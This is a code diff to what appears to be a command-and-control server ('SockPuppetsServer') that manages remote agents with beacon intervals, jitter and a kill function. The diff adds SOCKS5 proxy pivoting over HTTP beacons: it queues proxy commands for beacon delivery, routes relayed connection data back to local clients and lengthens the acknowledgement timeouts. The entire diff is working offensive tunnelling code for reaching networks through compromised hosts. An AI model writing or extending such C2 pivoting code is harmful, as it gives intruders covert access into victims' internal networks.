@@ -100,6 +100,7 @@ class Agent:
         self.response_queue = asyncio.Queue()
         self.socks_proxy = None
         self.socks_data_queues = {}  # conn_id -> asyncio.Queue
+        self.socks_pending_commands = asyncio.Queue()  # SOCKS cmds for HTTP beacon delivery
         self.mode = metadata.get('mode', 'streaming')  # 'beacon' or 'streaming'
         self.beacon_interval = metadata.get('beacon_interval', 60)
         self.beacon_jitter = metadata.get('beacon_jitter', 0)
@@ -844,6 +845,24 @@ class SockPuppetsServer:
             if results:
                 logger.info(f"Checkin results from {agent_id}: {len(results)}")
             for result in results:
+                # Route SOCKS relay data from beacon results to the appropriate queue
+                msg_type = result.get('type', '')
+                if msg_type in ('socks_data', 'socks_close', 'socks_connect_ack', 'socks_error'):
+                    conn_id = result.get('conn_id', '')
+                    if conn_id and conn_id in agent.socks_data_queues:
+                        if msg_type == 'socks_data':
+                            socks_payload = result.get('data', '')
+                            asyncio.ensure_future(agent.socks_data_queues[conn_id].put(socks_payload))
+                        elif msg_type == 'socks_close':
+                            asyncio.ensure_future(agent.socks_data_queues[conn_id].put(None))
+                        elif msg_type == 'socks_connect_ack':
+                            asyncio.ensure_future(agent.socks_data_queues[conn_id].put(
+                                {'type': 'connect_ack', 'success': result.get('success', False)}
+                            ))
+                        elif msg_type == 'socks_error':
+                            asyncio.ensure_future(agent.socks_data_queues[conn_id].put(None))
+                    continue
+
                 output = result.get('output', '')
                 command = result.get('command', '')
                 timestamp = result.get('timestamp', '')
@@ -904,6 +923,15 @@ class SockPuppetsServer:
                         })
                 except asyncio.TimeoutError:
                     pass
+
+            # Drain queued SOCKS commands for beacon delivery
+            if hasattr(agent, 'socks_pending_commands'):
+                while not agent.socks_pending_commands.empty():
+                    try:
+                        socks_cmd = agent.socks_pending_commands.get_nowait()
+                        commands.append(socks_cmd)
+                    except asyncio.QueueEmpty:
+                        break
 
             response = {'type': 'commands', 'commands': commands} if commands else {'type': 'no_commands'}
             if commands:
@@ -1545,17 +1573,24 @@ class SockPuppetsServer:
 
         return "Failed to kill agent"
 
+    async def _send_socks_to_agent(self, agent: 'Agent', message: dict):
+        """Send a SOCKS message to an agent via its transport (WS or HTTP beacon)"""
+        if agent.is_http():
+            if not hasattr(agent, 'socks_pending_commands'):
+                agent.socks_pending_commands = asyncio.Queue()
+            await agent.socks_pending_commands.put(message)
+        else:
+            encrypted = self.simple_encrypt(json.dumps(message), agent.encryption_key)
+            await agent.websocket.send(encrypted)
+
     async def start_socks_proxy(self, agent_id: str, local_port: int) -> str:
-        """Start SOCKS5 proxy through agent"""
+        """Start SOCKS5 proxy through agent (WebSocket or HTTP beacon)"""
         if agent_id not in self.agents:
             return "Agent not found"
 
         agent = self.agents[agent_id]
 
-        if agent.is_http():
-            return "SOCKS proxy is not supported over HTTP transport (requires WebSocket)"
-
-        if agent.websocket not in self.active_connections:
+        if not agent.is_http() and agent.websocket not in self.active_connections:
             return "Agent not connected"
 
         if agent.socks_proxy is not None:
@@ -1563,17 +1598,23 @@ class SockPuppetsServer:
 
         try:
             agent.socks_proxy = local_port
+            if not hasattr(agent, 'socks_pending_commands'):
+                agent.socks_pending_commands = asyncio.Queue()
             agent.socks_task = asyncio.create_task(self._run_socks_server(agent_id, local_port))
 
             message = {
                 'type': 'socks_init',
                 'port': local_port
             }
-            encrypted = self.simple_encrypt(json.dumps(message), agent.encryption_key)
-            await agent.websocket.send(encrypted)
+            if agent.is_http():
+                await agent.socks_pending_commands.put(message)
+            else:
+                encrypted = self.simple_encrypt(json.dumps(message), agent.encryption_key)
+                await agent.websocket.send(encrypted)
 
-            logger.info(f"SOCKS proxy started for {agent_id} on port {local_port}")
-            return f"SOCKS proxy started on 127.0.0.1:{local_port}"
+            transport_note = " (beacon — latency ≈ beacon interval)" if agent.is_http() else ""
+            logger.info(f"SOCKS proxy started for {agent_id} on port {local_port}{transport_note}")
+            return f"SOCKS proxy started on 127.0.0.1:{local_port}{transport_note}"
 
         except Exception as e:
             agent.socks_proxy = None
@@ -1597,7 +1638,11 @@ class SockPuppetsServer:
         conn_id = str(uuid.uuid4())[:8]
         try:
             agent = self.agents.get(agent_id)
-            if not agent or agent.websocket not in self.active_connections:
+            if not agent:
+                writer.close()
+                await writer.wait_closed()
+                return
+            if not agent.is_http() and agent.websocket not in self.active_connections:
                 writer.close()
                 await writer.wait_closed()
                 return
@@ -1657,11 +1702,11 @@ class SockPuppetsServer:
                 'port': port,
                 'conn_id': conn_id
             }
-            encrypted = self.simple_encrypt(json.dumps(conn_msg), agent.encryption_key)
-            await agent.websocket.send(encrypted)
+            await self._send_socks_to_agent(agent, conn_msg)
 
+            ack_timeout = 30.0 if agent.is_http() else 15.0
             try:
-                ack = await asyncio.wait_for(agent.socks_data_queues[conn_id].get(), timeout=15.0)
+                ack = await asyncio.wait_for(agent.socks_data_queues[conn_id].get(), timeout=ack_timeout)
                 if isinstance(ack, dict) and ack.get('type') == 'connect_ack':
                     if not ack.get('success'):
                         writer.write(b'\x05\x05\x00\x01' + b'\x00' * 6)
@@ -1710,8 +1755,7 @@ class SockPuppetsServer:
                     'conn_id': conn_id,
                     'data': base64.b64encode(data).decode()
                 }
-                encrypted = self.simple_encrypt(json.dumps(msg), agent.encryption_key)
-                await agent.websocket.send(encrypted)
+                await self._send_socks_to_agent(agent, msg)
         except Exception as e:
             logger.error(f"Relay to agent error: {e}")
 
